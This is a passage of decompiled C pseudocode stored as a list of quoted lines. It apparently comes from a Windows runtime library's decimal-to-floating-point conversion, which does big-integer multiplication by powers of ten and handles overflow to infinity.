    "            }",
    "          }",
    "        }",
    "        LODWORD(v7) = 0;",
    "        v8 = 0;",
    "      }",
    "      v18 = *v10;",
    "      ++v8;",
    "      ++v10;",
    "      LODWORD(v7) = v18 + 10 * v7;",
    "    }",
    "    while ( v10 != (unsigned __int8 *)v9 );",
    "    if ( v8 )",
    "    {",
    "      v19 = v8 / 0xA;",
    "      v20 = v8 / 0xA;",
    "      v269 = v8 / 0xA;",
    "      if ( v8 / 0xA )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v21 = v20;",
    "          if ( v20 > 0x26 )",
    "            v21 = 38;",
    "          v260 = v21;",
    "          v22 = (unsigned int)(v21 - 1);",
    "          v23 = (unsigned __int8)byte_18003C8C2[4 * v22];",
    "          v24 = (unsigned __int8)byte_18003C8C3[4 * v22];",
    "          v25 = v23;",
    "          v293 = v24 + v23;",
    "          sub_1800368A0(v294, 0, 4 * v23);",
    "          sub_180036160(&v294[v25], 0x180000000LL + 4LL * (unsigned __int16)word_18003C8C0[2 * v22] + 245680, 4 * v24);",
    "          v26 = v293;",
    "          if ( v293 > 1 )",
    "          {",
    "            if ( v5 > 1 )",
    "            {",
    "              v38 = v5;",
    "              v39 = v294;",
    "              if ( v293 < v5 )",
    "                v38 = v293;",
    "              else",
    "                v39 = v290;",
    "              v283 = v39;",
    "              v40 = v290;",
    "              if ( v293 >= v5 )",
    "                v40 = v294;",
    "              v274 = v40;",
    "              v291 = 0;",
    "              v41 = 0;",
    "              if ( v293 < v5 )",
    "                v26 = v5;",
    "              v5 = 0;",
    "              while ( 1 )",
    "              {",
    "                v42 = (unsigned int)v39[v41];",
    "                if ( (_DWORD)v42 )",
    "                {",
    "                  LODWORD(v43) = 0;",
    "                  v44 = v41;",
    "                  if ( v26 )",
    "                  {",
    "                    while ( v44 != 115 )",
    "                    {",
    "                      v45 = v44;",
    "                      if ( v44 == v5 )",
    "                      {",
    "                        v292[v44] = 0;",
    "                        v291 = v44 + 1;",
    "                      }",
    "                      v46 = v44++;",
    "                      v47 = v292[v45] + (unsigned int)v43 + v42 * (unsigned int)v40[v46 - v41];",
    "                      v292[v45] = v47;",
    "                      v5 = v291;",
    "                      v43 = HIDWORD(v47);",
    "                      if ( v44 - v41 == v26 )",
    "                        break;",
    "                      v40 = v274;",
    "                    }",
    "                    if ( (_DWORD)v43 )",
    "                    {",
    "                      while ( v44 != 115 )",
    "                      {",
    "                        v48 = v44 + 1;",
    "                        v49 = v44;",
    "                        v108 = v44++ == v5;",
    "                        if ( v108 )",
    "                        {",
    "                          v292[v49] = 0;",
    "                          v291 = v48;",
    "                        }",
    "                        v50 = (unsigned int)v43 + (unsigned __int64)v292[v49];",
    "                        v292[v49] = v50;",
    "                        v5 = v291;",
    "                        LODWORD(v43) = HIDWORD(v50);",
    "                        if ( !HIDWORD(v50) )",
    "                          goto LABEL_78;",
    "                      }",
    "LABEL_98:",
    "                      v5 = 0;",
    "                      v289 = 0;",
    "                      goto LABEL_99;",
    "                    }",
    "                  }",
    "LABEL_78:",
    "                  if ( v44 == 115 )",
    "                    goto LABEL_98;",
    "                  v39 = v283;",
    "                  v40 = v274;",
    "                }",
    "                else if ( v41 == v5 )",
    "                {",
    "                  v5 = v41 + 1;",
    "                  v292[v41] = 0;",
    "                  v291 = v41 + 1;",
    "                }",
    "                if ( ++v41 == v38 )",
    "                {",
    "                  v51 = 4LL * v5;",
    "                  v289 = v5;",
    "                  if ( v51 )",
    "                  {",
    "                    if ( v51 > 0x1CC )",
    "                    {",
    "                      sub_1800368A0(v290, 0, 460);",
    "                      *(_DWORD *)sub_18001A80C() = 34;",
    "                      invalid_parameter_noinfo();",
    "                    }",
    "                    else",
    "                    {",
    "                      sub_180036160(v290, v292, v51);",
    "                    }",
    "                    v5 = v289;",
    "                  }",
    "                  goto LABEL_86;",
    "                }",
    "              }",
    "            }",
    "            v32 = v290[0];",
    "            v33 = 4LL * v293;",
    "            v289 = v293;",
    "            v5 = v293;",
    "            if ( v33 )",
    "            {",
    "              if ( v33 > 0x1CC )",
    "              {",
    "                sub_1800368A0(v290, 0, 460);",
    "                *(_DWORD *)sub_18001A80C() = 34;",
    "                invalid_parameter_noinfo();",
    "              }",
    "              else",
    "              {",
    "                sub_180036160(v290, v294, v33);",
    "              }",
    "              v5 = v289;",
    "            }",
    "            if ( !(_DWORD)v32 )",
    "            {",
    "LABEL_31:",
    "              v5 = 0;",
    "              v289 = 0;",
    "LABEL_53:",
    "              v37 = 1;",
    "              goto LABEL_54;",
    "            }",
    "            if ( (_DWORD)v32 == 1 || !v5 )",
    "              goto LABEL_53;",
    "            LODWORD(v27) = 0;",
    "            v34 = 0;",
    "            do",
    "            {",
    "              v35 = v34++;",
    "              v36 = (unsigned int)v27 + v32 * (unsigned int)v290[v35];",
    "              v290[v35] = v36;",
    "              v27 = HIDWORD(v36);",
    "            }",
    "            while ( v34 != v5 );",
    "          }",
    "          else",
    "          {",
    "            if ( !v294[0] )",
    "              goto LABEL_31;",
    "            if ( v294[0] == 1 || !v5 )",
    "              goto LABEL_53;",
    "            LODWORD(v27) = 0;",
    "            v28 = 0;",
    "            v29 = v294[0];",
    "            do",
    "            {",
    "              v30 = v28++;",
    "              v31 = (unsigned int)v27 + v29 * (unsigned int)v290[v30];",
    "              v290[v30] = v31;",
    "              v27 = HIDWORD(v31);",
    "            }",
    "            while ( v28 != v5 );",
    "          }",
    "          if ( !(_DWORD)v27 )",
    "          {",
    "            v5 = v289;",
    "            goto LABEL_53;",
    "          }",
    "          if ( v289 < 0x73 )",
    "          {",
    "            v290[v289] = v27;",
    "            v5 = ++v289;",
    "            goto LABEL_53;",
    "          }",
    "          v37 = 0;",
    "          v289 = 0;",
    "          v5 = 0;",
    "LABEL_54:",
    "          if ( !v37 )",
    "            goto LABEL_98;",
    "LABEL_86:",
    "          v108 = v269 == v260;",
    "          v20 = v269 - v260;",
    "          v269 -= v260;",
    "          if ( v108 )",
    "          {",
    "            v19 = v8 / 0xA;",
    "            break;",
    "          }",
    "        }",
    "      }",
    "      v52 = v8 - 10 * v19;",
    "      if ( v52 )",
    "      {",
    "        v53 = dword_18003C958[v52 - 1];",
    "        if ( !v53 )",
    "          goto LABEL_98;",
    "        if ( v53 != 1 && v5 )",
    "        {",
    "          LODWORD(v54) = 0;",
    "          v55 = 0;",
    "          do",
    "          {",
    "            v56 = v55++;",
    "            v57 = (unsigned int)v54 + v53 * (unsigned __int64)(unsigned int)v290[v56];",
    "            v290[v56] = v57;",
    "            v54 = HIDWORD(v57);",
    "          }",
    "          while ( v55 != v5 );",
    "          if ( HIDWORD(v57) )",
    "          {",
    "            if ( v289 >= 0x73 )",
    "              goto LABEL_98;",
    "            v290[v289] = HIDWORD(v57);",
    "            v5 = ++v289;",
    "          }",
    "          else",
    "          {",
    "            v5 = v289;",
    "          }",
    "        }",
    "      }",
    "LABEL_99:",
    "      if ( (_DWORD)v7 )",
    "      {",
    "        v58 = 0;",
    "        if ( !v5 )",
    "          goto LABEL_103;",
    "        do",
    "        {",
    "          v59 = v58++;",
    "          v60 = (unsigned int)v7 + (unsigned __int64)(unsigned int)v290[v59];",
    "          v290[v59] = v60;",
    "          v5 = v289;",
    "          LODWORD(v7) = HIDWORD(v60);",
    "        }",
    "        while ( v58 != v289 );",
    "        if ( HIDWORD(v60) )",
    "        {",
    "LABEL_103:",
    "          if ( v5 >= 0x73 )",
    "          {",
    "            v5 = 0;",
    "            v289 = 0;",
    "          }",
    "          else",
    "          {",
    "            v290[v5] = v7;",
    "            v5 = ++v289;",
    "          }",
    "        }",
    "      }",
    "    }",
    "  }",
    "  v61 = v263;",
    "  if ( !v263 )",
    "    goto LABEL_181;",
    "  v62 = v263 / 0xA;",
    "  v63 = v263 / 0xA;",
    "  v270 = v263 / 0xA;",
    "  if ( !(v263 / 0xA) )",
    "    goto LABEL_168;",
    "  do",
    "  {",
    "    v64 = v63;",
    "    if ( v63 > 0x26 )",
    "      v64 = 38;",
    "    v266 = v64;",
    "    v65 = (unsigned int)(v64 - 1);",
    "    v66 = (unsigned __int8)byte_18003C8C2[4 * v65];",
    "    v67 = (unsigned __int8)byte_18003C8C3[4 * v65];",
    "    v68 = v66;",
    "    v293 = v67 + v66;",
    "    sub_1800368A0(v294, 0, 4 * v66);",
    "    sub_180036160(&v294[v68], 0x180000000LL + 4LL * (unsigned __int16)word_18003C8C0[2 * v65] + 245680, 4 * v67);",
    "    v69 = v293;",
    "    if ( v293 <= 1 )",
    "    {",
    "      if ( !v294[0] )",
    "      {",
    "LABEL_112:",
    "        v5 = 0;",
    "        v289 = 0;",
    "        goto LABEL_134;",
    "      }",
    "      if ( v294[0] == 1 || !v5 )",
    "        goto LABEL_134;",
    "      LODWORD(v70) = 0;",
    "      v71 = 0;",
    "      v72 = v294[0];",
    "      do",
    "      {",
    "        v73 = v71++;",
    "        v74 = (unsigned int)v70 + v72 * (unsigned int)v290[v73];",
    "        v290[v73] = v74;",
    "        v70 = HIDWORD(v74);",
    "      }",
    "      while ( v71 != v5 );",
    "LABEL_129:",
    "      if ( (_DWORD)v70 )",
    "      {",
    "        if ( v289 >= 0x73 )",
    "        {",
    "          v80 = 0;",
    "          v289 = 0;",
    "          v5 = 0;",
    "          goto LABEL_135;",
    "        }",
    "        v290[v289] = v70;",
    "        v5 = ++v289;",
    "      }",
    "      else",
    "      {",
    "        v5 = v289;",
    "      }",
    "LABEL_134:",
    "      v80 = 1;",
    "LABEL_135:",
    "      if ( !v80 )",
    "        goto LABEL_136;",
    "      goto LABEL_166;",
    "    }",
    "    if ( v5 <= 1 )",
    "    {",
    "      v75 = v290[0];",
    "      v76 = 4LL * v293;",
    "      v289 = v293;",
    "      v5 = v293;",
    "      if ( v76 )",
    "      {",
    "        if ( v76 > 0x1CC )",
    "        {",
    "          sub_1800368A0(v290, 0, 460);",
    "          *(_DWORD *)sub_18001A80C() = 34;",
    "          invalid_parameter_noinfo();",
    "        }",
    "        else",
    "        {",
    "          sub_180036160(v290, v294, v76);",
    "        }",
    "        v5 = v289;",
    "      }",
    "      if ( !(_DWORD)v75 )",
    "        goto LABEL_112;",
    "      if ( (_DWORD)v75 == 1 || !v5 )",
    "        goto LABEL_134;",
    "      LODWORD(v70) = 0;",
    "      v77 = 0;",
    "      do",
    "      {",
    "        v78 = v77++;",
    "        v79 = (unsigned int)v70 + v75 * (unsigned int)v290[v78];",
    "        v290[v78] = v79;",
    "        v70 = HIDWORD(v79);",
    "      }",
    "      while ( v77 != v5 );",
    "      goto LABEL_129;",
    "    }",
    "    v83 = v5;",
    "    v84 = v294;",
    "    if ( v293 >= v5 )",
    "      v84 = v290;",
    "    v85 = v290;",
    "    if ( v293 >= v5 )",
    "      v85 = v294;",
    "    else",
    "      v83 = v293;",
    "    v291 = 0;",
    "    v86 = 0;",
    "    if ( v293 < v5 )",
    "      v69 = v5;",
    "    v5 = 0;",
    "    do",
    "    {",
    "      v87 = (unsigned int)v84[v86];",
    "      if ( (_DWORD)v87 )",
    "      {",
    "        LODWORD(v88) = 0;",
    "        v89 = v86;",
    "        if ( v69 )",
    "        {",
    "          do",
    "          {",
    "            if ( v89 == 115 )",
    "              break;",
    "            v90 = v89;",
    "            if ( v89 == v5 )",
    "            {",
    "              v292[v89] = 0;",
    "              v291 = v89 + 1;",
    "            }",
    "            v91 = v89++;",
    "            v92 = v292[v90] + (unsigned int)v88 + v87 * (unsigned int)v85[v91 - v86];",
    "            v292[v90] = v92;",
    "            v5 = v291;",
    "            v88 = HIDWORD(v92);",
    "          }",
    "          while ( v89 - v86 != v69 );",
    "          if ( (_DWORD)v88 )",
    "          {",
    "            while ( v89 != 115 )",
    "            {",
    "              v93 = v89 + 1;",
    "              v94 = v89;",
    "              v108 = v89++ == v5;",
    "              if ( v108 )",
    "              {",
    "                v292[v94] = 0;",
    "                v291 = v93;",
    "              }",
    "              v95 = v292[v94] + (unsigned __int64)(unsigned int)v88;",
    "              v292[v94] = v95;",
    "              v5 = v291;",
    "              LODWORD(v88) = HIDWORD(v95);",
    "              if ( !HIDWORD(v95) )",
    "                goto LABEL_159;",
    "            }",
    "LABEL_136:",
    "            v81 = *(unsigned __int64 **)a2;",
    "            v82 = *(_BYTE *)(a1 + 776);",
    "            if ( a2[8] )",
    "              *v81 = *v81 & 0x7FF0000000000000LL",
    "                   | ((-(__int64)(v82 != 0) & 0x8000000000000000uLL) + 0x7FF0000000000000LL) & 0xFFF0000000000000uLL;",
    "            else",
    "              *(_DWORD *)v81 = *(_DWORD *)v81 & 0x7F800000 | (v82 != 0 ? -8388608 : 2139095040) & 0xFF800000;",
    "            return 3;",
    "          }",
    "        }",
    "LABEL_159:",
    "        if ( v89 == 115 )",
    "          goto LABEL_136;",
    "      }",
    "      else if ( v86 == v5 )",
    "      {",
    "        v5 = v86 + 1;",
    "        v292[v86] = 0;",
    "        v291 = v86 + 1;",
    "      }",
    "      ++v86;",
    "    }",
    "    while ( v86 != v83 );",
    "    v96 = 4LL * v5;",
    "    v289 = v5;",
    "    if ( v96 )",
    "    {",
    "      if ( v96 > 0x1CC )",
    "      {",
    "        sub_1800368A0(v290, 0, 460);",
    "        *(_DWORD *)sub_18001A80C() = 34;",
    "        invalid_parameter_noinfo();",
    "      }",
    "      else",
    "      {",
    "        sub_180036160(v290, v292, v96);",
    "      }",
    "      v5 = v289;",
    "    }",
    "LABEL_166:",
    "    v108 = v270 == v266;",
    "    v63 = v270 - v266;",
    "    v270 -= v266;",
    "  }",
    "  while ( !v108 );",
    "  v62 = v263 / 0xA;",
    "  v61 = v263;",
    "LABEL_168:",
    "  v97 = v61 - 10 * v62;",
    "  if ( !v97 )",
    "    goto LABEL_181;",
    "  v98 = (unsigned int)dword_18003C958[v97 - 1];",
    "  if ( !(_DWORD)v98 )",
    "  {",
    "    v5 = 0;",
    "    v289 = 0;",
    "    goto LABEL_181;",
    "  }",
    "  if ( (_DWORD)v98 == 1 )",
    "  {",
    "LABEL_181:",
    "    if ( !v5 )",
    "      goto LABEL_182;",
    "    v105 = v5 - 1;",
    "    v108 = !_BitScanReverse((unsigned int *)&v106, v290[v105]);",
    "    if ( v108 )",
    "      v107 = 0;",
    "    else",
    "      v107 = v106 + 1;",
    "    v104 = v107 + 32 * v105;",
    "  }",
    "  else",
    "  {",
    "    if ( v5 )",
    "    {",
    "      LODWORD(v99) = 0;",
    "      v100 = 0;",
    "      do",
    "      {",
    "        v101 = v100++;",
    "        v102 = (unsigned int)v99 + v98 * (unsigned int)v290[v101];",
    "        v290[v101] = v102;",
    "        v99 = HIDWORD(v102);",
    "      }",
    "      while ( v100 != v5 );",
    "      if ( HIDWORD(v102) )",
    "      {",
    "        if ( v289 >= 0x73 )",
    "          goto LABEL_136;",
    "        v290[v289] = HIDWORD(v102);",
    "        v5 = ++v289;",
    "      }",
    "      else",
    "      {",
    "        v5 = v289;",
    "      }",
    "      goto LABEL_181;",
    "    }",
    "LABEL_182:",
    "    v104 = 0;",
    "  }",
    "  v271 = v104;",
    "  if ( v104 >= v276 )",
    "  {",
    "    v108 = v272 == 0;",
    "    return sub_18001BB34(&v289, v104, *(_BYTE *)(a1 + 776), !v108, (__int64)a2);",
    "  }",
    "  v108 = v272 == 0;",
    "  if ( !v272 )",
    "    return sub_18001BB34(&v289, v104, *(_BYTE *)(a1 + 776), !v108, (__int64)a2);",
    "  v109 = v282;",
    "  v110 = 0;",
    "  LODWORD(v111) = 0;",
    "  v287 = 0;",
    "  v112 = 0;",
    "  if ( v282 == v280 )",
    "    goto LABEL_284;",
    "  while ( 2 )",
    "  {",
    "    if ( v112 == 9 )",
    "    {",
    "      if ( v110 )",
    "      {",
    "        LODWORD(v113) = 0;",
    "        v114 = 0;",
    "        do",
    "        {",
    "          v115 = v114++;",
    "          v116 = (unsigned int)v113 + 1000000000LL * (unsigned int)Destination[v115];",
    "          Destination[v115] = v116;",
    "          v113 = HIDWORD(v116);",
    "        }",
    "        while ( v114 != v110 );",
    "        if ( HIDWORD(v116) )",
    "        {",
    "          if ( v287 < 0x73 )",
    "          {",
    "            Destination[v287] = HIDWORD(v116);",
    "            v110 = ++v287;",
    "            goto LABEL_199;",
    "          }",
    "          v295 = 0;",
    "          v287 = 0;",
    "          memcpy_s(Destination, 0x1CCu, Source, 0);",
    "        }",
    "        v110 = v287;",
    "      }",
    "LABEL_199:",
    "      if ( (_DWORD)v111 )",
    "      {",
    "        v117 = 0;",
    "        if ( !v110 )",
    "          goto LABEL_203;",
    "        do",
    "        {",
    "          v118 = v117++;",
    "          v119 = (unsigned int)v111 + (unsigned __int64)(unsigned int)Destination[v118];",
    "          Destination[v118] = v119;",
    "          v110 = v287;",
    "          v111 = HIDWORD(v119);",
    "        }",
    "        while ( v117 != v287 );",
    "        if ( HIDWORD(v119) )",
    "        {",
    "LABEL_203:",
    "          if ( v110 >= 0x73 )",
    "          {",
    "            v295 = 0;",
    "            v287 = 0;",
    "            memcpy_s(Destination, 0x1CCu, Source, 0);",
    "            v110 = 0;",
    "          }",
    "          else",
    "          {",
    "            Destination[v110] = v111;",
    "            v110 = ++v287;",
    "          }",
    "        }",
    "      }",
    "      LODWORD(v111) = 0;",
    "      v112 = 0;",
    "    }",
    "    v120 = *v109;",
    "    ++v112;",
    "    ++v109;",
    "    LODWORD(v111) = v120 + 10 * v111;",
    "    if ( v109 != v280 )",
    "      continue;",
    "    break;",
    "  }",
    "  if ( !v112 )",
    "    goto LABEL_284;",
    "  v121 = v112 / 0xA;",
    "  v122 = v112 / 0xA;",
    "  v264 = v112 / 0xA;",
    "  if ( !(v112 / 0xA) )",
    "    goto LABEL_264;",
    "  while ( 2 )",
    "  {",
    "    v123 = v122;",
    "    if ( v122 > 0x26 )",
    "      v123 = 38;",
    "    v267 = v123;",
    "    v124 = (unsigned int)(v123 - 1);",
    "    v125 = (unsigned __int8)byte_18003C8C2[4 * v124];",
    "    v126 = (unsigned __int8)byte_18003C8C3[4 * v124];",
    "    v127 = v125;",
    "    v293 = v126 + v125;",
    "    sub_1800368A0(v294, 0, 4 * v125);",
    "    sub_180036160(&v294[v127], (char *)&unk_18003BFB0 + 4 * (unsigned __int16)word_18003C8C0[2 * v124], 4 * v126);",
    "    v128 = v293;",
    "    if ( v293 <= 1 )",
    "    {",
    "      if ( !v294[0] )",
    "      {",
    "        v295 = 0;",
    "        v287 = 0;",
    "LABEL_215:",
    "        v129 = 0;",
    "        v130 = Source;",
    "LABEL_258:",
    "        memcpy_s(Destination, 0x1CCu, v130, v129);",
    "LABEL_259:",
    "        v110 = v287;",
    "LABEL_260:",
    "        v136 = 1;",
    "        goto LABEL_261;",
    "      }",
    "      if ( v294[0] == 1 || !v110 )",
    "        goto LABEL_260;",
    "      LODWORD(v131) = 0;",
    "      v132 = 0;",
    "      v133 = v294[0];",
    "      do",
    "      {",
    "        v134 = v132++;",
    "        v135 = (unsigned int)v131 + v133 * (unsigned int)Destination[v134];",
    "        Destination[v134] = v135;",
    "        v131 = HIDWORD(v135);",
    "      }",
    "      while ( v132 != v110 );",
    "      if ( !HIDWORD(v135) )",
    "        goto LABEL_259;",
    "      if ( v287 < 0x73 )",
    "      {",
    "LABEL_222:",
    "        Destination[v287] = v131;",
    "        v110 = ++v287;",
    "        goto LABEL_260;",
    "      }",
    "LABEL_223:",
    "      v295 = 0;",
    "      v287 = 0;",
    "      memcpy_s(Destination, 0x1CCu, Source, 0);",
    "      v136 = 0;",
    "      v110 = 0;",
    "      goto LABEL_261;",
    "    }",
    "    if ( v110 <= 1 )",
    "    {",
    "      v137 = Destination[0];",
    "      v287 = v293;",
    "      memcpy_s(Destination, 0x1CCu, v294, 4LL * v293);",
    "      if ( !(_DWORD)v137 )",
    "      {",
    "        v295 = 0;",
    "        v287 = 0;",
    "        goto LABEL_215;",
    "      }",
    "      v110 = v287;",
    "      if ( (_DWORD)v137 == 1 )",
    "        goto LABEL_260;",
    "      LODWORD(v131) = 0;",
    "      v138 = 0;",
    "      do",
    "      {",
    "        v139 = v138++;",
    "        v140 = (unsigned int)v131 + v137 * (unsigned int)Destination[v139];",
    "        Destination[v139] = v140;",
    "        v131 = HIDWORD(v140);",
    "      }",
    "      while ( v138 != v110 );",
    "      if ( !HIDWORD(v140) )",
    "        goto LABEL_259;",
    "      if ( v287 < 0x73 )",
    "        goto LABEL_222;",
    "      goto LABEL_223;",
    "    }",
    "    v141 = v294;",
    "    v142 = v110;",
    "    if ( v293 < v110 )",
    "      v142 = v293;",
    "    else",
    "      v141 = Destination;",
    "    v284 = v141;",
    "    v143 = Destination;",
    "    v261 = v142;",
    "    if ( v293 < v110 )",
    "      v128 = v110;",
    "    else",
    "      v143 = v294;",
    "    v144 = 0;",
    "    v145 = 0;",
    "    v291 = 0;",
    "    v146 = v143;",
    "    while ( 2 )",
    "    {",
    "      v147 = (unsigned int)v141[v145];",
    "      if ( !(_DWORD)v147 )",
    "      {",
    "        if ( (_DWORD)v145 == v144 )",
    "        {",
    "          v292[v145] = 0;",
    "          v144 = v145 + 1;",
    "          v291 = v145 + 1;",
    "        }",
    "LABEL_256:",
    "        v145 = (unsigned int)(v145 + 1);",
    "        if ( (_DWORD)v145 == v142 )",
    "        {",
    "          v130 = v292;",
    "          v129 = 4LL * v144;",
    "          v287 = v144;",
    "          goto LABEL_258;",
    "        }",
    "        continue;",
    "      }",
    "      break;",
    "    }",
    "    LODWORD(v148) = 0;",
    "    v149 = v145;",
    "    if ( v128 )",
    "    {",
    "      do",
    "      {",
    "        if ( v149 == 115 )",
    "          break;",
    "        v150 = v149;",
    "        if ( v149 == v144 )",
    "        {",
    "          v292[v149] = 0;",
    "          v291 = v149 + 1;",
    "        }",
    "        v151 = v149++;",
    "        v152 = (unsigned int)v148 + v292[v150] + v147 * (unsigned int)v146[(unsigned int)(v151 - v145)];",
    "        v292[v150] = v152;",
    "        v148 = HIDWORD(v152);",
    "        v144 = v291;",
    "      }",
    "      while ( v149 - (_DWORD)v145 != v128 );",
    "      if ( (_DWORD)v148 )",
    "      {",
    "        do",
    "        {",
    "          if ( v149 == 115 )",
    "            break;",
    "          v153 = v149 + 1;",
    "          v154 = v149;",
    "          v108 = v149++ == v144;",
    "          if ( v108 )",
    "          {",
    "            v292[v154] = 0;",
    "            v291 = v153;",
    "          }",
    "          v155 = (unsigned int)v148 + (unsigned __int64)v292[v154];",
    "          v292[v154] = v155;",
    "          v144 = v291;",
    "          LODWORD(v148) = HIDWORD(v155);",
    "        }",
    "        while ( HIDWORD(v155) );",
    "      }",
    "      v142 = v261;",
    "    }",
    "    if ( v149 != 115 )",
    "    {",
    "      v141 = v284;",
    "      goto LABEL_256;",
    "    }",
    "    v295 = 0;",
    "    v287 = 0;",
    "    memcpy_s(Destination, 0x1CCu, Source, 0);",
    "    v110 = 0;",
    "    v136 = 0;",
    "LABEL_261:",
    "    if ( !v136 )",
    "      goto LABEL_268;",
    "    v108 = v264 == v267;",
    "    v122 = v264 - v267;",
    "    v264 -= v267;",
    "    if ( !v108 )",
    "      continue;",
    "    break;",
    "  }",
    "  v121 = v112 / 0xA;",
    "LABEL_264:",
    "  v156 = v112 - 10 * v121;",
    "  if ( v156 )",
    "  {",
    "    v157 = dword_18003C958[v156 - 1];",
    "    if ( !v157 )",
    "      goto LABEL_268;",
    "    if ( v157 != 1 && v110 )",
    "    {",
    "      LODWORD(v161) = 0;",
    "      v162 = 0;",
    "      v163 = (unsigned int)dword_18003C958[v156 - 1];",
    "      do",
    "      {",
    "        v164 = v162++;",
    "        v165 = (unsigned int)v161 + v163 * (unsigned int)Destination[v164];",
    "        Destination[v164] = v165;",
    "        v161 = HIDWORD(v165);",
    "      }",
    "      while ( v162 != v110 );",
    "      if ( HIDWORD(v165) )",
    "      {",
    "        if ( v287 < 0x73 )",
    "        {",
    "          Destination[v287] = HIDWORD(v165);",
    "          v110 = ++v287;",
    "          goto LABEL_269;",
    "        }",
    "LABEL_268:",
    "        v295 = 0;",
    "        v287 = 0;",
    "        memcpy_s(Destination, 0x1CCu, Source, 0);",
    "        v110 = 0;",
    "        goto LABEL_269;",
    "      }",
    "      v110 = v287;",
    "    }",
    "  }",
    "LABEL_269:",
    "  if ( (_DWORD)v111 )",
    "  {",
    "    v158 = 0;",
    "    if ( !v110 )",
    "      goto LABEL_273;",
    "    do",
    "    {",
    "      v159 = v158++;",
    "      v160 = (unsigned int)v111 + (unsigned __int64)(unsigned int)Destination[v159];",
    "      Destination[v159] = v160;",
    "      v110 = v287;",
    "      LODWORD(v111) = HIDWORD(v160);",
    "    }",
    "    while ( v158 != v287 );",
    "    if ( HIDWORD(v160) )",
    "    {",
    "LABEL_273:",
    "      if ( v110 >= 0x73 )",
    "      {",
    "        v295 = 0;",
    "        v287 = 0;",
    "        memcpy_s(Destination, 0x1CCu, Source, 0);",
    "        v110 = 0;",
    "      }",
    "      else",
    "      {",
    "        Destination[v110] = v111;",
    "        v110 = ++v287;",
    "      }",
    "    }",
    "  }",
    "LABEL_284:",
    "  v166 = 1;",
    "  *(_QWORD *)v292 = 1;",
    "  v262 = 1;",
    "  v167 = v272 - *(_DWORD *)a1;",
    "  v168 = *(int *)a1 < 0;",
    "  v291 = 1;",
    "  if ( !v168 )",
    "    v167 = v285;",
    "  v273 = v167;",
    "  v169 = v167 / 0xA;",
    "  v268 = v167 / 0xA;",
    "  v170 = v167 / 0xA;",
    "  v265 = v167 / 0xA;",
    "  if ( v167 / 0xA )",
    "  {",
    "LABEL_287:",
    "    v171 = v170;",
    "    if ( v170 > 0x26 )",
    "      v171 = 38;",
    "    v275 = v171;",
    "    v172 = (unsigned int)(v171 - 1);",
    "    v173 = (unsigned __int8)byte_18003C8C2[4 * v172];",
    "    v174 = (unsigned __int8)byte_18003C8C3[4 * v172];",
    "    v175 = v173;",
    "    v295 = v174 + v173;",
    "    sub_1800368A0(Source, 0, 4 * v173);",
    "    sub_180036160(&Source[v175], (char *)&unk_18003BFB0 + 4 * (unsigned __int16)word_18003C8C0[2 * v172], 4 * v174);",
    "    v176 = v295;",
    "    if ( v295 <= 1 )",
    "    {",
    "      if ( !Source[0] )",
    "      {",
    "        v293 = 0;",
    "        v291 = 0;",
    "        memcpy_s(v292, 0x1CCu, v294, 0);",
    "        goto LABEL_292;",
    "      }",
    "      if ( Source[0] != 1 && v166 )",
    "      {",
    "        LODWORD(v178) = 0;",
    "        v179 = 0;",
    "        v180 = Source[0];",
    "        do",
    "        {",
    "          v181 = v179++;",
    "          v182 = (unsigned int)v178 + v180 * v292[v181];",
    "          v292[v181] = v182;",
    "          v178 = HIDWORD(v182);",
    "        }",
    "        while ( v179 != v166 );",
    "        if ( HIDWORD(v182) )",
    "        {",
    "          if ( v291 >= 0x73 )",
    "            goto LABEL_313;",
    "          v292[v291] = HIDWORD(v182);",
    "          v166 = ++v291;",
    "        }",
    "        else",
    "        {",
    "LABEL_292:",
    "          v166 = v291;",
    "        }",
    "        v262 = v166;",
    "      }",
    "      v177 = 1;",
    "      goto LABEL_341;",
    "    }",
    "    if ( v166 <= 1 )",
    "    {",
    "      v183 = v292[0];",
    "      v291 = v295;",
    "      memcpy_s(v292, 0x1CCu, Source, 4LL * v295);",
    "      if ( !(_DWORD)v183 )",
    "      {",
    "        v295 = 0;",
    "        v291 = 0;",
    "        memcpy_s(v292, 0x1CCu, Source, 0);",
    "        goto LABEL_338;",
    "      }",
    "      v166 = v291;",
    "      v262 = v291;",
    "      if ( (_DWORD)v183 != 1 && v291 )",
    "      {",
    "        LODWORD(v184) = 0;",
    "        v185 = 0;",
    "        do",
    "        {",
    "          v186 = v185++;",
    "          v187 = (unsigned int)v184 + v183 * v292[v186];",
    "          v292[v186] = v187;",
    "          v184 = HIDWORD(v187);",
    "        }",
    "        while ( v185 != v166 );",
    "        if ( HIDWORD(v187) )",
    "        {",
    "          if ( v291 < 0x73 )",
    "          {",
    "            v292[v291] = HIDWORD(v187);",
    "            v166 = ++v291;",
    "            goto LABEL_339;",
    "          }",
    "LABEL_313:",
    "          v295 = 0;",
    "          v291 = 0;",
    "          memcpy_s(v292, 0x1CCu, Source, 0);",
    "          v166 = v291;",
    "          v177 = 0;",
    "          v262 = v291;",
    "          goto LABEL_341;",
    "        }",
    "LABEL_338:",
    "        v166 = v291;",
    "LABEL_339:",
    "        v262 = v166;",
    "      }",
    "      v177 = 1;",
    "      goto LABEL_341;",
    "    }",
    "    v188 = Source;",
    "    v189 = v166;",
    "    if ( v295 < v166 )",
    "      v189 = v295;",
    "    else",
    "      v188 = v292;",
    "    v281 = v188;",
    "    v190 = v292;",
    "    if ( v295 < v166 )",
    "      v176 = v166;",
    "    else",
    "      v190 = Source;",
    "    v191 = 0;",
    "    v192 = 0;",
    "    v293 = 0;",
    "    v193 = v190;",
    "    while ( 1 )",
    "    {",
    "      v194 = v188[v192];",
    "      if ( (_DWORD)v194 )",
    "      {",
    "        LODWORD(v195) = 0;",
    "        v196 = v192;",
    "        if ( v176 )",
    "        {",
    "          do",
    "          {",
    "            if ( v196 == 115 )",
    "              break;",
    "            v197 = v196;",
    "            if ( v196 == v191 )",
    "            {",
    "              v294[v196] = 0;",
    "              v293 = v196 + 1;",
    "            }",
    "            v198 = v196++;",
    "            v199 = (unsigned int)v294[v197]",
    "                 + (unsigned int)v195",
    "                 + v194 * *((unsigned int *)v193 + (unsigned int)(v198 - v192));",
    "            v294[v197] = v199;",
    "            v195 = HIDWORD(v199);",
    "            v191 = v293;",
    "          }",
    "          while ( v196 - (_DWORD)v192 != v176 );",
    "          if ( (_DWORD)v195 )",
    "          {",
    "            while ( v196 != 115 )",
    "            {",
    "              v200 = v196 + 1;",
    "              v201 = v196;",
    "              v108 = v196++ == v191;",
    "              if ( v108 )",
    "              {",
    "                v294[v201] = 0;",
    "                v293 = v200;",
    "              }",
